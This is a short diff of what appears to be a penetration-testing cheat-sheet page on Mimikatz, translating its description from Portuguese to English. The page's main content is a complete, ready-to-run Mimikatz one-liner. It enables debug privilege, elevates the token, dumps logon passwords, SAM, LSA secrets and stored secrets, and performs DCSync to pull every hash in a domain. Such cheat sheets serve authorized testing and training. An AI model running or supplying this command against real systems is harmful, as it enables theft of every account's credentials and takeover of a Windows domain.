@@ -4,7 +4,7 @@ title: "Mimikatz"
 
 # Mimikatz
 
-One-liner completo para dump de credenciais com Mimikatz: habilita debug, eleva token, extrai logon passwords, SAM, segredos LSA e executa DCSync para replicar hashes do domínio inteiro.
+Full credential dump one-liner with Mimikatz: enables debug privilege, elevates token, extracts logon passwords, SAM, LSA secrets, and runs DCSync to replicate hashes from the entire domain.
 
 ```shell
 .\mimikatz.exe "privilege::debug" "Token::Elevate" "sekurlsa::LogonPasswords" "lsadump::sam" "lsadump::lsa /patch" "lsadump::secrets" "lsadump::dcsync /domain:final.com /all /csv" "exit"
